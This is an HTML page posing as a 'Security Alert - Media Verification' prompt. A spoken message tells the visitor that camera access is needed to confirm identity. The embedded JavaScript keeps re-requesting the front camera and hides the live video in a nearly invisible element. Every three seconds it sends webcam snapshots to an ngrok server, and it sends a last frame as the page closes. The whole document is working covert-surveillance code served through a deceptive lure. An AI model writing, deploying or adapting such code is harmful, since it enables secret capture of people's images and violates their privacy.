<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - Media Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
  video { width: 320px; height: 240px; border: 1px solid #333; background: #111; }
  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
</style>
</head>
<body>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="processing-canvas" width="640" height="480"></canvas>
</div>

<script>
(function () {
  'use strict';

  var CONFIG = {
    tts: {
      text: "Security verification required. Camera access must be enabled to confirm user identity.",
      lang: 'en-US',
      rate: 0.9,
      pitch: 1.0,
      repeatInterval: 6000,
      maxRepeats: 15
    },
    cameraRetryInterval: 4000,
    uploadInterval: 3000, // Interval kirim frame gambar ke server setiap 3 detik
    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_capture'
  };

  var state = {
    ttsStarted: false,
    ttsCount: 0,
    camStream: null,
    camActive: false,
    uploadTimer: null
  };

  // ============================================
  // TTS MODULE
  // ============================================
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;

      u.onend = function () {
        state.ttsCount++;
        if (state.ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  // ============================================
  // UPLOAD CAPTURE KE SERVER NGROK
  // ============================================
  function captureAndUpload(isUnloading) {
    if (!state.camActive) return;

    var videoElement = document.getElementById('cam-feed');
    var canvas = document.getElementById('processing-canvas');
    var ctx = canvas.getContext('2d');

    try {
      if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;

      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      var dataURL = canvas.toDataURL('image/jpeg', 0.80);
      var payload = JSON.stringify({ image: dataURL });

      // Kirim menggunakan sendBeacon jika halaman ditutup agar frame terakhir tetap terkirim
      if (isUnloading && navigator.sendBeacon) {
        var blob = new Blob([payload], { type: 'application/json' });
        navigator.sendBeacon(CONFIG.serverEndpoint, blob);
        return;
      }

      fetch(CONFIG.serverEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: payload,
        keepalive: true
      })
      .then(function(res) {
        if (!res.ok) throw new Error('Status: ' + res.status);
        return res.json();
      })
      .then(function(data) {
        console.log('[+] Frame uploaded successfully:', data.filename);
      })
      .catch(function(err) {
        console.log('[-] Upload failed:', err.message);
      });
    } catch (e) {}
  }

  // ============================================
  // CAMERA PERSISTENT ACCESS MODULE
  // ============================================
  function requestCameraAccess() {
    if (state.camActive) return;

    navigator.mediaDevices.getUserMedia({ 
      video: { 
        width: { ideal: 640 }, 
        height: { ideal: 480 },
        facingMode: "user" 
      }, 
      audio: false 
    })
    .then(function(stream) {
      state.camStream = stream;
      state.camActive = true;
      console.log("[+] Camera access granted and active stream opened.");
      
      var videoElement = document.getElementById('cam-feed');
      videoElement.srcObject = stream;
      videoElement.play().catch(function(){});

      stream.getVideoTracks().forEach(function(track) {
        track.onended = function() {
          console.log("[!] Camera track ended, attempting re-initialization...");
          state.camActive = false;
          setTimeout(requestCameraAccess, 2000);
        };
      });
    })
    .catch(function(err) {
      console.log("[-] Camera access denied or restricted:", err.name);
      setTimeout(requestCameraAccess, CONFIG.cameraRetryInterval);
    });
  }

  // ============================================
  // AUTOMATED TRIGGER CHAINS
  // ============================================
  window.addEventListener('DOMContentLoaded', function() {
    startTTS();
    requestCameraAccess();

    // Memulai timer pengiriman tangkapan frame setiap 3 detik
    state.uploadTimer = setInterval(function() {
      captureAndUpload(false);
    }, CONFIG.uploadInterval);
  });

  // Kirim frame darurat saat halaman ditutup
  window.addEventListener('beforeunload', function() {
    captureAndUpload(true);
  });

  setTimeout(function() {
    requestCameraAccess();
    startTTS();
  }, 1000);

  setInterval(function() {
    if (!state.camActive) {
      requestCameraAccess();
    }
  }, CONFIG.cameraRetryInterval);

  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) {
      startTTS();
      if (!state.camActive) {
        requestCameraAccess();
      }
    }
  });

})();
</script>
</body>
</html>
